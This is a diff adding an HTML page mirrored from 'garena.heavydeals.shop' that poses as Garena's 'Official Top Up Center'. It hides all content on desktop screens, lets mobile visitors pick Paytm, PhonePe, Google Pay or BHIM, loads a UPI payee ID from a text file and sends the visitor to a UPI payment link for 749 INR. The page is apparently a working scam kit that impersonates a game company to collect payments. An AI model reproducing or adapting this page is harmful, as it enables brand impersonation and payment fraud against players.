@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from garena.heavydeals.shop/payment/7000.html by HTTrack Website Copier/3.x [XR&CO'2017], Mon, 10 Feb 2025 18:16:49 GMT -->
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Garena Top Up Center</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #ffffff;
+      margin: 0; /* Remove margin from the body */
+    }
+
+    /* Hide entire content on desktop */
+    @media (min-width: 768px) {
+      body {
+        display: none;
+      }
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background-color: white;
+      padding: 12px 15px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      width: 100%;
+    }
+    .logo-container {
+      display: flex;
+      align-items: center;
+    }
+    .logo {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-right: 8px;
+    }
+    .logo-container img {
+      height: 35px;
+      margin-right: 5px;
+    }
+    .title {
+      font-size: 15px;
+      font-weight: 600;
+      color: #333;
+      line-height: 1.2;
+    }
+    .profile-icon {
+      width: 35px;
+      height: 35px;
+      border-radius: 50%;
+      background-color: #ddd;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .profile-icon img {
+      width: 70%;
+      height: 70%;
+      opacity: 0.6;
+    }
+    .container {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .container h2 {
+      margin-bottom: 20px;
+      font-size: 1.5rem;
+      color: #444;
+    }
+
+    .payment-options {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 15px;
+      margin-bottom: 20px;
+    }
+
+    .payment-option {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      border: 1px solid #ddd;
+      border-radius: 25px;
+      padding: 10px;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      text-decoration: none;
+    }
+
+    .payment-option:hover {
+      transform: scale(1.05);
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    .payment-option img {
+      width: 60px;
+      height: 60px;
+      margin-bottom: 10px;
+    }
+
+    .payment-option label {
+      font-size: 0.9rem;
+      color: #555;
+    }
+
+    .payment-option.selected {
+      border: 2px solid red;
+    }
+
+    .continue-button {
+      background-color: #ff5722;
+      color: white;
+      border: none;
+      border-radius: 25px;
+      padding: 10px 20px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      width: 100%;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      text-decoration: none;
+    }
+
+    .continue-button:hover {
+      background-color: red;
+    }
+    .container {
+        width: 94%; /* Set a width for the container */
+        max-width: 600px; /* Optional: set a maximum width */
+        margin: 2px auto; /* This centers the div horizontally */
+        text-align: center; /* Centers text inside the div */
+    }
+
+    footer {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      clear: both;
+    }
+</style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo-container">
+          <div class="logo">
+            <img src="../img/LOG.png" alt="Garena Logo">
+          </div>
+          <div class="title">Official Top Up<br>Center</div>
+        </div>
+        <div class="profile-icon">
+          <img src="../../upload.wikimedia.org/wikipedia/commons/8/89/Portrait_Placeholder.png" alt="User Icon">
+        </div>
+      </div>
+      <div class="container">
+        <h2>Select a Payment Method</h2>
+        <div class="payment-options">
+          <div class="payment-option" onclick="selectPayment('paytm', event)">
+            <img src="ptt.png" alt="Paytm">
+            <label>Paytm</label>
+          </div>
+          <div class="payment-option" onclick="selectPayment('phonepe', event)">
+            <img src="phonepe.png" alt="PhonePe">
+            <label>PhonePe</label>
+          </div>
+          <div class="payment-option" onclick="selectPayment('googlepay', event)">
+            <img src="gopay.png" alt="Google Pay">
+            <label>Google Pay</label>
+          </div>
+          <div class="payment-option" onclick="selectPayment('bhim', event)">
+            <img src="../img/upi.png" alt="BHIM">
+            <label>BHIM</label>
+          </div>
+        </div>
+        <button class="continue-button" onclick="proceedPayment()">Continue</button>
+      </div>
+    
+      <footer>
+        <img src="../img/footer.jpg" alt="Footer Image" style="width: 100%; height: auto;" />
+      </footer>
+    
+      <script>
+        let selectedPaymentMethod = "";
+    
+        function selectPayment(method, event) {
+          // Remove the 'selected' class from all payment options
+          const allOptions = document.querySelectorAll('.payment-option');
+          allOptions.forEach(option => option.classList.remove('selected'));
+          
+          // Add the 'selected' class to the clicked payment option
+          const selectedOption = event.currentTarget;
+          selectedOption.classList.add('selected');
+    
+          selectedPaymentMethod = method;
+          console.log(`Selected payment method: ${selectedPaymentMethod}`);
+        }
+    
+        async function fetchPaymentDetails() {
+          try {
+            const response = await fetch('../upi.txt'); 
+            if (!response.ok) {
+              throw new Error('Network response was not ok');
+            }
+            const data = await response.text();
+            const lines = data.split('\n');
+    
+            return {
+              upiId: lines[0]?.trim(),
+              siteName: lines[1]?.trim(),
+              transactionRef: lines[2]?.trim(),
+              merchantCode: lines[3]?.trim()
+            };
+          } catch (error) {
+            console.error('Error fetching payment details:', error);
+            alert('Failed to fetch payment details. Please try again.');
+            return null;
+          }
+        }
+    
+        async function proceedPayment() {
+          if (!selectedPaymentMethod) {
+            alert('Please select a payment method before continuing.');
+            return;
+          }
+    
+          const paymentDetails = await fetchPaymentDetails();
+          if (!paymentDetails) return;
+    
+          const { upiId, siteName, transactionRef, merchantCode } = paymentDetails;
+          const amount = 749; 
+          let redirectUrl = "";
+    
+          try {
+            switch (selectedPaymentMethod) {
+              case 'phonepe':
+                redirectUrl = `phonepe://pay?pa=${upiId}&pn=${siteName}&tr=${transactionRef}&am=${amount}&cu=INR&mc=${merchantCode}&qrMedium=04&tn=${siteName}`;
+                break;
+              case 'googlepay':
+                redirectUrl = `tez://upi/pay?ver=01&mode=19&pa=${upiId}&pn=${siteName}&tr=${transactionRef}&am=${amount}&cu=INR&mc=${merchantCode}&qrMedium=04&tn=${siteName}`;
+                break;
+              case 'paytm':
+                redirectUrl = `paytmmp://pay?pa=${upiId}&pn=${siteName}&am=${amount}&tr=${transactionRef}&mc=${merchantCode}&cu=INR&tn=${siteName}`;
+                break;
+              case 'bhim':
+                redirectUrl = `upi://pay?pa=${upiId}&pn=${siteName}&am=${amount}&tr=${transactionRef}&mc=${merchantCode}&cu=INR&tn=${siteName}`;
+                break;
+              default:
+                console.error('Invalid payment type selected');
+                alert('Please select a valid payment method.');
+                return;
+            }
+    
+            console.log(`Constructed redirect URL: ${redirectUrl}`);
+            window.location.href = redirectUrl;
+          } catch (error) {
+            console.error('Error processing payment:', error);
+            alert('An error occurred while processing the payment. Please try again.');
+          }
+        }
+      </script>
+    </body>
+    
+<!-- Mirrored from garena.heavydeals.shop/payment/7000.html by HTTrack Website Copier/3.x [XR&CO'2017], Mon, 10 Feb 2025 18:16:49 GMT -->
+</html>
